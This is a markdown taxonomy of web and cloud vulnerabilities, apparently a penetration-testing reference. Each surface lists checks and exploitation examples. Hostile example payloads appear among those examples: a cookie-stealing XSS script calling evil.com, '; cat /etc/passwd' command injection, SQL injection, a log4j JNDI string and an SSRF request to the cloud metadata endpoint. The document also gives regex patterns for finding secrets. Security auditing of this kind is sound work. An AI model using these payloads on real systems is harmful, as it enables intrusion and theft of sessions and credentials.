# Attack Surfaces

Vulnerability taxonomy organized by attack surface. Each surface lists specific checks, common vulnerabilities, and what to look for.

---

## Surface: auth

Authentication and authorization — the keys to the kingdom.

### Checks

- **Default credentials** — admin:admin, root:root, test:test, any documented defaults
- **Brute force resistance** — Rate limiting, account lockout, CAPTCHA
- **Password policy** — Minimum length, complexity, common password blocking
- **Session management** — Token entropy, expiration, invalidation on logout
- **Token security** — JWT algorithm confusion (none, HS256 vs RS256), secret strength, claim validation
- **OAuth/OIDC** — Redirect URI validation, state parameter, PKCE implementation
- **MFA bypass** — Can MFA be skipped? Is backup code predictable? Race conditions?
- **Password reset** — Token predictability, expiration, enumeration via response differences
- **Privilege escalation** — Horizontal (access other users), vertical (access admin)
- **IDOR** — Insecure Direct Object References — can you access resources by changing IDs?
- **Session fixation** — Can you force a known session ID?
- **Cookie security** — HttpOnly, Secure, SameSite flags

### What Exploitation Looks Like

- Forge a JWT with `alg: none` and access admin endpoints
- Change `user_id=123` to `user_id=124` and access another user's data
- Login with `admin:admin` on `/admin` or similar management interfaces
- Bypass MFA by removing the MFA verification step from the request flow

---

## Surface: injection

User input that reaches backends without proper sanitization.

### Checks

- **SQL injection** — Union-based, blind (boolean/time), error-based, second-order
- **Command injection** — OS command execution via user input, backticks, `$()`, pipes
- **XSS** — Reflected, stored, DOM-based, in headers, in error messages
- **Server-Side Template Injection (SSTI)** — Template engine code execution
- **LDAP injection** — Authentication bypass via LDAP filter manipulation
- **XML injection / XXE** — External entity inclusion, SSRF via XML parsing
- **Path traversal** — `../` sequences to access files outside intended directories
- **Header injection** — CRLF injection, host header attacks
- **NoSQL injection** — MongoDB `$gt`, `$ne` operators in queries
- **GraphQL injection** — Introspection enabled, query depth attacks, batch queries

### What Exploitation Looks Like

- Send `' OR '1'='1` in a login form and bypass authentication
- Send `; cat /etc/passwd` in a filename parameter and get system files
- Inject `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` and steal sessions
- Send `{{7*7}}` in a template field and get `49` back — confirming SSTI

---

## Surface: secrets

Hardcoded credentials, exposed keys, and sensitive data in source control.

### Checks

- **Source code** — Grep for API keys, tokens, passwords, connection strings
- **Git history** — Secrets committed then "removed" (still in history)
- **Configuration files** — `.env` files, `config.yaml`, `application.properties`
- **Docker/container** — Build args with secrets, environment variables in images
- **CI/CD pipelines** — Secrets in workflow files, build logs, artifacts
- **Client-side** — API keys in JavaScript bundles, mobile app binaries
- **Comments** — TODO comments with temporary credentials
- **Documentation** — Example configs with real values
- **Dependency configs** — `package.json` scripts with inline secrets
- **Backup files** — `.bak`, `.old`, `.swp` files with credentials

### Patterns to Grep

```
password\s*=\s*['"]\S+
api[_-]?key\s*[:=]\s*['"]\S+
secret\s*[:=]\s*['"]\S+
token\s*[:=]\s*['"]\S+
AWS_ACCESS_KEY_ID
PRIVATE.KEY
-----BEGIN (RSA |EC )?PRIVATE KEY-----
mongodb(\+srv)?://\S+:\S+@
postgres://\S+:\S+@
mysql://\S+:\S+@
```

### What Exploitation Looks Like

- Find `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in a `.env` file committed 6 months ago
- Extract an API key from a minified JavaScript bundle
- Discover database credentials in a Docker image layer

---

## Surface: dependencies

Third-party packages with known vulnerabilities.

### Checks

- **Known CVEs** — Run `npm audit`, `pip audit`, `cargo audit`, `snyk test`, `grype`
- **Outdated packages** — Major version lag, EOL frameworks
- **Typosquatting** — Package names that look like popular packages but aren't
- **Lockfile integrity** — Modified checksums, missing lockfile
- **Transitive dependencies** — Vulnerabilities in dependencies-of-dependencies
- **Build tools** — Vulnerable compilers, bundlers, or build-time dependencies
- **Container base images** — Vulnerable OS packages in Docker base images

### Severity Assessment

| CVE Score | Exploitability | Reachability | Effective Severity |
|-----------|---------------|--------------|-------------------|
| Critical | Easy | Reachable from user input | Critical |
| Critical | Easy | Not reachable | Medium |
| High | Requires auth | Reachable | High |
| Any | Theoretical | Not in code path | Info |

Reachability matters more than raw CVSS score. A critical CVE in unused code is informational.

### What Exploitation Looks Like

- Identify `log4j` 2.14.1 in a Java app and achieve RCE via `${jndi:ldap://...}`
- Find a deserialization vulnerability in an outdated Jackson version
- Discover a prototype pollution vulnerability in a `lodash` version

---

## Surface: config

Misconfigurations in deployed services.

### Checks

- **Debug mode** — Stack traces, debug endpoints, verbose errors in production
- **Default settings** — Default admin pages, sample applications, test endpoints
- **CORS** — Overly permissive origins (`*`), credentials with wildcard
- **Security headers** — Missing CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- **TLS** — Weak ciphers, expired certificates, protocol downgrade
- **Directory listing** — Exposed file listings on web servers
- **Admin interfaces** — Exposed management panels (phpMyAdmin, Adminer, Grafana, etc.)
- **Error handling** — Stack traces, framework versions, internal paths leaked
- **HTTP methods** — PUT/DELETE enabled unintentionally
- **Cloud storage** — Public S3 buckets, Azure blobs, GCS buckets

### What Exploitation Looks Like

- Access `/debug/pprof` on a Go service and get memory dumps
- Find CORS allows `*` with credentials and steal authenticated data cross-origin
- Discover `.git/` is accessible on a web server and reconstruct the source code

---

## Surface: infrastructure

Network, containers, orchestration, and cloud misconfigurations.

### Checks

- **Container escape** — Privileged containers, host mounts, cap_sys_admin
- **Kubernetes** — RBAC misconfig, exposed dashboard, secrets in env vars, pod security
- **Network exposure** — Unnecessary ports, internal services on public interfaces
- **Cloud IAM** — Overpermissioned roles, public resources, metadata endpoint access
- **SSH** — Weak keys, password auth enabled, authorized_keys management
- **Firewall rules** — Overly permissive ingress/egress, unused rules
- **Service mesh** — mTLS bypasses, sidecar misconfig
- **DNS** — Zone transfer, subdomain takeover, dangling CNAME

### What Exploitation Looks Like

- Access the Kubernetes dashboard without auth and deploy a pod
- Reach the cloud metadata endpoint (169.254.169.254) from a container and get IAM credentials
- Find an EC2 instance with an IAM role that has `s3:*` and dump all buckets

---

## Surface: data

PII, financial data, and sensitive information handling.

### Checks

- **Encryption at rest** — Database encryption, file encryption, backup encryption
- **Encryption in transit** — TLS everywhere, no mixed content, certificate pinning
- **PII exposure** — User data in logs, URLs, error messages, analytics
- **Data minimization** — Collecting more than needed, retaining longer than needed
- **Backup security** — Backup accessibility, encryption, retention
- **Data leakage** — Verbose API responses, unnecessary fields returned
- **Anonymization** — Test/staging environments with production data
- **Access controls** — Who can access what data, audit trails

### What Exploitation Looks Like

- Find full user records (name, email, address, SSN) in application logs
- Discover unencrypted database backups in a public S3 bucket
- API returns full user object including password hash when only name was requested

---

## Surface: api

HTTP/gRPC/GraphQL endpoint security.

### Checks

- **BOLA (Broken Object Level Authorization)** — Change resource IDs, access other users' objects
- **Mass assignment** — Send extra fields (role, isAdmin) in create/update requests
- **Rate limiting** — Brute force endpoints, enumeration, resource exhaustion
- **Input validation** — Type confusion, boundary values, oversized payloads
- **Broken Function Level Authorization** — Access admin endpoints as regular user
- **SSRF** — Server-side requests to internal services via user-controlled URLs
- **Batch operations** — Bypass rate limits via batch endpoints
- **GraphQL-specific** — Introspection enabled, query depth, field suggestions
- **API versioning** — Old API versions with fixed vulnerabilities still accessible
- **Documentation exposure** — Swagger/OpenAPI docs with internal endpoints

### What Exploitation Looks Like

- Change `GET /api/orders/123` to `GET /api/orders/124` and see another user's order
- POST to `/api/users` with `{"name": "test", "role": "admin"}` and get admin privileges
- Use `/api/v1/login` (no rate limit) instead of `/api/v2/login` (rate limited)
- Send `{"url": "http://169.254.169.254/latest/meta-data/"}` to an image proxy and get cloud credentials

---

*Every surface is a door. Your job is to try every handle.*
